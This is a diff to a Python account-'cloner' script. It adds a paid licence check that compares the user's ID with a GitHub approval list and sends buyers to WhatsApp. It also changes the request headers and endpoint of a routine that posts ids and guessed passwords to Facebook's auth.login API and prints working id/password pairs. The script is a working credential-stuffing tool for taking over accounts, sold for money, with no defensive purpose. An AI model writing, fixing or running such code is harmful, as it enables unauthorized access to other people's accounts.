@@ -149,6 +149,27 @@ id=[]
 tokenku=[]
 
 
+def chk():
+  uuid = str(os.geteuid()) + str(os.getlogin()) 
+  id = "|".join(uuid)
+  print("\n\n\x1b[37;1m  YOUR ID : \033[94m"+id) 
+  try: 
+    httpCaht = requests.get("https://github.com/DaniMalik1/paid/blob/main/Approvel.txt").text 
+    if id in httpCaht: 
+      print("\033[92m  YOUR ID IS ACTIVE. .......\033[97m") 
+      msg = str(os.geteuid()) 
+      time.sleep(1) 
+      pass 
+    else: 
+      print("\033[0;96m YOUR ID IS NOT ACTIVE COPY👆 AND SEND ME MESSAGE ON WHATSAPP \033[0;91m#NOT FREE!!!") 
+      os.system('xdg-open  https://wa.me/+08801712034653?text=*Hello*%2C%20*Blessing*%20*i*%20*want*%20*to*%20*buy*%20*your*%20*command*%20*apk*%Full Updated*Updated*')
+      time.sleep(1) 
+      sys.exit() 
+  except: 
+    sys.exit() 
+    if name == '__main__': 
+     print (logo)
+     chk() 
 
 def ckx():
 	uuid = str(os.geteuid()) + str(os.getlogin())
@@ -168,7 +189,7 @@ def Spy():
 	clear()
 	#ckx()
 	print(f" [1] FILE Cloner (SYSTEM API) ")
-	print(f" [2] BD Random Cloner ")
+	print(f" [2] Not working ") 
 	print(f" [3] Gmail Cloning")
 	print(f" [0] Exit")
 	me=input(f' Choice : ')
@@ -759,23 +780,23 @@ def apix(ids,passlist):
                                         "fb_api_req_friendly_name": "authenticate",
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                 head = {
-                                        'Host': 'mbasic.facebook.com',
-                'cache-control': 'max-age=0',
-                'upgrade-insecure-requests': '1',
-                'origin': 'https://mbasic.facebook.com',
-                'content-type': 'application/x-www-form-urlencoded',
-                'user-agent': 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G981U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/92.0.4515.166 Mobile Safari/537.36',
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-                'x-requested-with': 'mark.via.gp',
-                'sec-fetch-site': 'same-origin',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-user': 'empty',
-                'sec-fetch-dest': 'document',
-                'referer': 'https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
-                'accept-encoding': 'gzip, deflate br',
-                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}
+                                        "Host":cebok,
+                    "cache-control":"max-age=0",
+                    "upgrade-insecure-requests":"1",
+                    "origin":"https://"+cebok,
+                    "content-type":"application/x-www-form-urlencoded",
+                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
+                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                    "x-requested-with":"XMLHttpRequest",
+                    "sec-fetch-site":"same-origin",
+                    "sec-fetch-mode":"cors",
+                    "sec-fetch-user":"empty",
+                    "sec-fetch-dest":"document",
+                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
+                    "accept-encoding":"gzip, deflate br",
+                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
                                 url = 'https://b-api.facebook.com/method/auth.login'
-                                po = requests.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=data,headers=head,allow_redirects=False).text
+                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
                                         print(f'\r\r\033[1;32m [MANi-OK] '+ids+' | '+pas+'\033[1;97m')
@@ -804,3 +825,7 @@ def apix(ids,passlist):
 
 
 Spy()
+
+
+
+
